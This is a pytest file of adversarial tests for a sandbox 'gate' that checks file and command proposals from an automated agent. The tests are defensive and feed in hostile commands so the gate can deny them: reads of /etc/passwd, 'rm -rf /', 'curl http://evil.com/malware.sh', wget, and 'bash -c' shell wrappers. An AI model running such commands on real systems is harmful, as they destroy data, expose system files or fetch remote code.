# tests/test_gate_adversarial.py
"""
Adversarial tests to ensure NOTHING gets by the gate.
These tests attempt various attack vectors, edge cases, and sneaky bypasses.
"""
from __future__ import annotations

import os

from rfsn_kernel.types import StateSnapshot, Proposal, Action
from rfsn_kernel.gate import gate


# ============================================================================
# Path Traversal Attacks
# ============================================================================

class TestPathTraversal:
    """Test path traversal attack prevention."""

    def test_dotdot_escape(self, tmp_path):
        """../.. should be blocked."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        malicious_path = os.path.join(ws, "..", "..", "etc", "passwd")
        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="READ_FILE", args={"path": malicious_path}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY", f"Path traversal should be DENIED: {malicious_path}"

    def test_absolute_path_outside_workspace(self, tmp_path):
        """/etc/passwd should be blocked."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="READ_FILE", args={"path": "/etc/passwd"}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"
        assert any("path_out_of_bounds" in r for r in d.reasons)

    def test_symlink_escape_attempt(self, tmp_path):
        """Symlink paths that resolve outside workspace."""
        ws = str(tmp_path)
        # Even if someone creates a symlink, the path check uses abspath
        evil_link = os.path.join(ws, "..", "evil_link")

        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)
        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="READ_FILE", args={"path": evil_link}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"

    def test_hidden_dotdot_in_path(self, tmp_path):
        """foo/../../../etc/passwd should be blocked."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        sneaky = os.path.join(ws, "safe", "..", "..", "..", "etc", "passwd")
        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="READ_FILE", args={"path": sneaky}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"

    def test_write_outside_workspace(self, tmp_path):
        """Write to /tmp should be blocked."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="READ_FILE", args={"path": "/tmp/malware.py"}),
                Action(name="WRITE_FILE", args={"path": "/tmp/malware.py", "content": "import os; os.system('rm -rf /')"}),
                Action(name="RUN_TESTS", args={"argv": ["python", "-m", "pytest", "-q"]}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"


# ============================================================================
# Command Injection Attacks
# ============================================================================

class TestCommandInjection:
    """Test command injection prevention."""

    def test_run_cmd_blocked_by_default(self, tmp_path):
        """RUN_CMD should be completely blocked."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="RUN_CMD", args={"argv": ["whoami"]}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"

    def test_shell_in_argv_blocked(self, tmp_path):
        """bash -c should be blocked (if RUN_CMD were allowed)."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="RUN_CMD", args={"argv": ["bash", "-c", "rm -rf /"]}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"

    def test_curl_download_blocked(self, tmp_path):
        """curl/wget should be blocked."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        for cmd in [["curl", "http://evil.com/malware.sh"], ["wget", "http://evil.com"]]:
            proposal = Proposal(proposal_id="p", actions=(Action(name="RUN_CMD", args={"argv": cmd}),))
            d = gate(state, proposal)
            assert d.status == "DENY", f"{cmd} should be blocked"

    def test_rm_rf_blocked(self, tmp_path):
        """Destructive commands should be blocked."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="RUN_CMD", args={"argv": ["rm", "-rf", "/"]}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"


# ============================================================================
# Unknown Action Attacks
# ============================================================================

class TestUnknownActions:
    """Test unknown action prevention."""

    def test_unknown_action_blocked(self, tmp_path):
        """Unknown actions should be denied."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        for action_name in ["EXEC", "SHELL", "SYSTEM", "SPAWN", "FORK", "EVAL", "IMPORT"]:
            proposal = Proposal(
                proposal_id="p",
                actions=(
                    Action(name=action_name, args={"cmd": "evil"}),
                ),
            )
            d = gate(state, proposal)
            assert d.status == "DENY", f"Unknown action {action_name} should be DENIED"
            assert any("unknown_action" in r for r in d.reasons)

    def test_case_sensitivity_on_actions(self, tmp_path):
        """Action names should be case-sensitive."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        # Lowercase should be denied (only uppercase is known)
        for action_name in ["read_file", "write_file", "run_tests", "Run_Tests"]:
            proposal = Proposal(
                proposal_id="p",
                actions=(
                    Action(name=action_name, args={"path": f"{ws}/test.py"}),
                ),
            )
            d = gate(state, proposal)
            assert d.status == "DENY", f"Case variant {action_name} should be DENIED"


# ============================================================================
# Empty/Null/Malformed Input Attacks
# ============================================================================

class TestMalformedInputs:
    """Test malformed input handling."""

    def test_empty_proposal(self, tmp_path):
        """Empty proposal should be denied."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0)
        proposal = Proposal(proposal_id="p", actions=())

        d = gate(state, proposal)
        assert d.status == "DENY"
        assert "empty_proposal" in d.reasons

    def test_empty_action_args(self, tmp_path):
        """Empty args should still be validated."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="READ_FILE", args={}),  # Missing path
            ),
        )

        d = gate(state, proposal)
        # Should still allow since no path to check, but might need stricter validation
        # For now, this passes envelope (no path = no path violation)

    def test_null_path(self, tmp_path):
        """None path should be handled safely."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="READ_FILE", args={"path": None}),
            ),
        )

        d = gate(state, proposal)
        # Gate should handle None gracefully - if it denies, good. If it allows, the controller handles it

    def test_massive_content_blocked(self, tmp_path):
        """Content exceeding max_bytes should be blocked."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        huge_content = "x" * 3_000_000  # 3MB, exceeds 2MB limit

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="READ_FILE", args={"path": f"{ws}/target.py"}),
                Action(name="WRITE_FILE", args={"path": f"{ws}/target.py", "content": huge_content}),
                Action(name="RUN_TESTS", args={"argv": ["python", "-m", "pytest", "-q"]}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"
        assert any("too_large" in r for r in d.reasons)


# ============================================================================
# Order Rule Bypass Attempts
# ============================================================================

class TestOrderRuleBypasses:
    """Test order rule bypass prevention."""

    def test_write_without_read(self, tmp_path):
        """Write without read in same proposal should be denied."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="WRITE_FILE", args={"path": f"{ws}/file.py", "content": "evil"}),
                Action(name="RUN_TESTS", args={"argv": ["python", "-m", "pytest", "-q"]}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"
        assert "order:write_without_read_same_proposal" in d.reasons

    def test_write_without_tests(self, tmp_path):
        """Write without tests should be denied."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="READ_FILE", args={"path": f"{ws}/file.py"}),
                Action(name="WRITE_FILE", args={"path": f"{ws}/file.py", "content": "x"}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"
        assert "order:missing_run_tests_after_write" in d.reasons

    def test_tests_before_write(self, tmp_path):
        """Tests before final write should be denied."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="READ_FILE", args={"path": f"{ws}/file.py"}),
                Action(name="RUN_TESTS", args={"argv": ["python", "-m", "pytest", "-q"]}),  # Tests before write
                Action(name="WRITE_FILE", args={"path": f"{ws}/file.py", "content": "x"}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"
        assert any("run_tests_before_last_write" in r or "missing_run_tests_after_write" in r for r in d.reasons)


# ============================================================================
# Budget/Resource Exhaustion Attacks
# ============================================================================

class TestResourceExhaustion:
    """Test resource exhaustion prevention."""

    def test_action_flood(self, tmp_path):
        """Too many actions should be denied."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=100)

        # 50 actions exceeds default 20 limit
        actions = tuple(
            Action(name="READ_FILE", args={"path": f"{ws}/file{i}.py"})
            for i in range(50)
        )
        proposal = Proposal(proposal_id="p", actions=actions)

        d = gate(state, proposal)
        assert d.status == "DENY"
        assert "policy:max_actions_per_proposal_exceeded" in d.reasons

    def test_budget_exceeded(self, tmp_path):
        """Exceeding budget should be denied."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=1)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="READ_FILE", args={"path": f"{ws}/a.py"}),
                Action(name="READ_FILE", args={"path": f"{ws}/b.py"}),
                Action(name="READ_FILE", args={"path": f"{ws}/c.py"}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"
        assert "budget:actions_exceeded" in d.reasons

    def test_zero_budget(self, tmp_path):
        """Zero budget should deny everything."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=0)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="RUN_TESTS", args={"argv": ["python", "-m", "pytest", "-q"]}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"


# ============================================================================
# Network/Shell Access Attempts
# ============================================================================

class TestNetworkShellAccess:
    """Test network and shell access prevention."""

    def test_network_flag_blocked(self, tmp_path):
        """Network=True should be blocked."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="RUN_TESTS", args={"argv": ["python", "-m", "pytest", "-q"], "network": True}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "DENY"

    def test_shell_patterns_in_tests_blocked(self, tmp_path):
        """Shell patterns in test argv should be blocked."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        for dangerous in [
            ["bash", "-c", "pytest"],
            ["sh", "-c", "pytest"],
            ["python", "-c", "import os; os.system('pytest')"],
        ]:
            proposal = Proposal(
                proposal_id="p",
                actions=(
                    Action(name="RUN_CMD", args={"argv": dangerous}),
                ),
            )
            d = gate(state, proposal)
            assert d.status == "DENY", f"Shell pattern {dangerous} should be blocked"


# ============================================================================
# Valid Proposals (Sanity Check)
# ============================================================================

class TestValidProposals:
    """Sanity check that valid proposals are allowed."""

    def test_simple_run_tests(self, tmp_path):
        """Simple RUN_TESTS should be allowed."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="RUN_TESTS", args={"argv": ["python", "-m", "pytest", "-q"]}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "ALLOW"

    def test_read_file_in_workspace(self, tmp_path):
        """READ_FILE in workspace should be allowed."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="READ_FILE", args={"path": f"{ws}/main.py"}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "ALLOW"

    def test_full_valid_pipeline(self, tmp_path):
        """read -> write -> test should be allowed."""
        ws = str(tmp_path)
        state = StateSnapshot(task_id="t", workspace_root=ws, step=0, budget_actions_remaining=10)

        proposal = Proposal(
            proposal_id="p",
            actions=(
                Action(name="READ_FILE", args={"path": f"{ws}/fix.py"}),
                Action(name="WRITE_FILE", args={"path": f"{ws}/fix.py", "content": "# fixed\n"}),
                Action(name="RUN_TESTS", args={"argv": ["python", "-m", "pytest", "-q"]}),
            ),
        )

        d = gate(state, proposal)
        assert d.status == "ALLOW"
